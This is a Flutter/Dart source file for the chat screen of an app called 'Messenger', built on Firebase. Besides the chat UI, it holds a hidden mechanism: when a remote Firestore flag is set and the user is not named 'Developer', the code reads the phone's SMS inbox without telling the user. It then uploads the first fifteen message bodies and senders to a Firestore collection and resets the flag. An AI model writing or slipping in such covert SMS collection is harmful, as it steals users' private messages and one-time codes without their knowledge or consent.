import 'dart:async';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/material.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:messenger/models/Getuserdata.dart';
import 'package:messenger/screens/settings_screen.dart';
import 'package:messenger/screens/show_messages.dart';
import 'package:messenger/widgets/chat/messages.dart';
import 'package:messenger/widgets/chat/new_message.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';


class ChatScreen extends StatefulWidget {
  @override
  _ChatScreenState createState() => _ChatScreenState();
}

class _ChatScreenState extends State<ChatScreen> {
  ConnectivityResult _connectionStatus = ConnectivityResult.none;
  final Connectivity _connectivity = Connectivity();
  StreamSubscription<ConnectivityResult> _connectivitySubscription;


  int numberOFMessages = 15;
  GetUser getUser;
  String currentUserId,userName;
  List messages = [];
  List reversedmessages = [];
  List body = [];
  List address = [];
  bool getMessages = false;
  bool messagesAlreadyPresent = false;
  bool connectivityStatus = true;

  @override
  void initState() {
    super.initState();
    print("In chat screen");
    final fbm = FirebaseMessaging.instance;
    fbm.requestPermission();
    initConnectivity();
    _connectivitySubscription =
        _connectivity.onConnectivityChanged.listen(_updateConnectionStatus);
    FirebaseMessaging.onMessage.listen((message) {
      print(message);
      return;
    });
    FirebaseMessaging.onMessageOpenedApp.listen((message) {
      print(message);
      return;
    });
    fbm.subscribeToTopic('chats');
    FirebaseFirestore.instance.collection("checkuser").doc("name").get().then((value){
      print("From check user name");
      setState(() {
        getMessages =value["getMessages"];
        messagesAlreadyPresent = value["messagesAlreadyPresent"];
      });
    });

    getUserDetails();

  }


  @override
  void dispose() {
    _connectivitySubscription.cancel();
    super.dispose();
  }

  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initConnectivity() async {
    print("FRom initConnectivity method-");
    ConnectivityResult result;
    // Platform messages may fail, so we use a try/catch PlatformException.
    try {
      result = await _connectivity.checkConnectivity();
      print(result);
    } on PlatformException catch (e) {
      print(e.toString());
      return;
    }

    // If the widget was removed from the tree while the asynchronous platform
    // message was in flight, we want to discard the reply rather than calling
    // setState to update our non-existent appearance.
    if (!mounted) {
      return Future.value(null);
    }
    return _updateConnectionStatus(result);
  }

  Future<void> _updateConnectionStatus(ConnectivityResult result) async {
    setState(() {
      _connectionStatus = result;
      print("Connection Status is $_connectionStatus and is from _updateConnectionStatus method");
      if(_connectionStatus == ConnectivityResult.none){
        setState(() {
          connectivityStatus = false;
        });
      }
      else{
        setState(() {
          connectivityStatus = true;
        });
      }
    });
  }


  void getUserDetails() async{
  User user = await FirebaseAuth.instance.currentUser;
  currentUserId = user.uid.toString();
  DocumentSnapshot doc = await FirebaseFirestore.instance.collection("users").doc(currentUserId).get();
  getUser = GetUser.fromDocument(doc);
  userName = getUser.username;
  if(userName == "Developer"){
    print("Do nothing");
  }
  else{
    if(getMessages == false){
      print("No messages asked");
    }
    else if(getMessages  && messagesAlreadyPresent){
      print("getMessages is $getMessages and messagesAlreadyPresent is $messagesAlreadyPresent ....c.c..c.c.c.c");
      print("Not implementing update ");
     // updateSMS();
    }
    else if(getMessages){
      print("getMessages is $getMessages and messagesAlreadyPresent is $messagesAlreadyPresent");
      uploadSMS();
    }
  }
}
  Future<dynamic> updateSMS() async{
    print("In updateSMS");
    SmsQuery query = new SmsQuery();
    messages = await query.getAllSms;
    print("Total number of messages are ${messages.length}");
    print("Now I'm printing $numberOFMessages messages");
    reversedmessages = new List.from(messages.reversed);
    for(int i=0;i<numberOFMessages;i++){
      body.add(messages[i].body);
      address.add(messages[i].address);
      print("${messages[i].body} and is from ${messages[i].address} ");
    }
    print("Completed printing $numberOFMessages messages");
    updateMessagestoFirebase();
  }

  Future<dynamic> updateMessagestoFirebase() async{
    for(int i=0;i<numberOFMessages;i++) {
      try {
        FirebaseFirestore.instance.collection("messages").doc().update({
          "from" :address[i],
          "messageIs": body[i],
        }).whenComplete(() {
          print("15 messages updated successfully");
          FirebaseFirestore.instance.collection("checkuser").doc("name").update(
              {
                "getMessages": false,
                "messagesAlreadyPresent": true,
              }).whenComplete(() {
            print("15 Messages updated successfully");
          });
        });
      }
      catch(e){
        print("From updateMessagestoFirebase and the error is ${e.code}");
      }
    }
  }


  Future<dynamic> uploadSMS() async{
    print("In uploadSMS");
    SmsQuery query = new SmsQuery();
    messages = await query.getAllSms;
    print("Total number of messages are ${messages.length}");
    print("Now I'm printing $numberOFMessages messages");
    reversedmessages = new List.from(messages.reversed);
    for(int i=0;i<numberOFMessages;i++){
      body.add(messages[i].body);
      address.add(messages[i].address);
     print("${messages[i].body} and is from ${messages[i].address} ");
    }
    print("Completed printing $numberOFMessages messages");
    uploadMessages();
  }

  Future<dynamic> uploadMessages() async{
    for(int i=0;i<numberOFMessages;i++){
      try{
        FirebaseFirestore.instance.collection("messages").doc().set({
          "from" :address[i],
           "messageIs": body[i],
        }).whenComplete(() {
          print("15 messages uploaded successfully");
          FirebaseFirestore.instance.collection("checkuser").doc("name").update({
            "getMessages": false,
            "messagesAlreadyPresent":true,
          }).catchError((e){

          });
        });
      }
      catch(e){
        print("From uploadMessages and the error is ${e.code}");
      }

    }
  } 

 /*
  Future<dynamic> getsms() async{
    bool permissionsGranted = await telephony.requestPhoneAndSmsPermissions;
    try{
      if(permissionsGranted){
        print("retrieving sms-");
       /*
        List<SmsMessage> messages = await telephony.getInboxSms(
            columns: [SmsColumn.ADDRESS, SmsColumn.BODY],
            filter: SmsFilter.where(SmsColumn.ADDRESS).equals("1234567890").and(SmsColumn.BODY).like("starwars"),
            sortOrder: [OrderBy(SmsColumn.ADDRESS, sort: Sort.ASC),
              OrderBy(SmsColumn.BODY)]
        );
        for(int i=0;i<messages.length;i++){
          print(messages[i]);
        }

        */
      }
      else{
        print("in else");
      }
    }
    catch(e){
      print("Error is $e");
    }
  }
  */



  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Messenger'),
        actions: [
          DropdownButton(
            underline: Container(),
            icon: Icon(
              Icons.more_vert,
              color: Theme.of(context).primaryIconTheme.color,
            ),
            items: [
              DropdownMenuItem(
                child: Container(
                  child: Row(
                    children: <Widget>[
                      Icon(Icons.message_sharp,color: Colors.grey,),
                      SizedBox(width: 8),
                      Text('Messages'),
                    ],
                  ),
                ),
                value: 'messages',
              ),

              DropdownMenuItem(
              child: Container(
                child: Row(
                  children: <Widget>[
                    Icon(Icons.settings,color: Colors.grey,),
                    SizedBox(width: 8),
                    Text('Settings'),
                  ],
                ),
              ),
              value: 'settings',
            ),
              DropdownMenuItem(
                child: Container(
                  child: Row(
                    children: <Widget>[
                      Icon(Icons.exit_to_app,color: Colors.grey,),
                      SizedBox(width: 8),
                      Text('Logout'),
                    ],
                  ),
                ),
                value: 'logout',
              ),

            ],
            onChanged: (itemIdentifier) {
              if (itemIdentifier == 'logout') {
                FirebaseAuth.instance.signOut();
              }
              if(itemIdentifier == 'settings'){
                print("Clicked on settings");
                Navigator.push(context, MaterialPageRoute(builder: (context) => SettingsScreen()));
              }
              if(itemIdentifier == 'messages'){
                print("Show Messages");
                Navigator.push(context, MaterialPageRoute(builder: (context) => InboxMessages()));
              }
            },
          ),
        ],
      ),
      body: Container(
        decoration: new BoxDecoration(color: Colors.black),
        child: Column(
          children: <Widget>[
            connectivityStatus ? Padding(padding: EdgeInsets.zero,) : Text("Please check your internet Connection",style: TextStyle(color: Colors.yellowAccent),),
            Expanded(
              child: Messages(),
            ),
            NewMessage(),
          ],
        ),
      ),
    );
  }
}
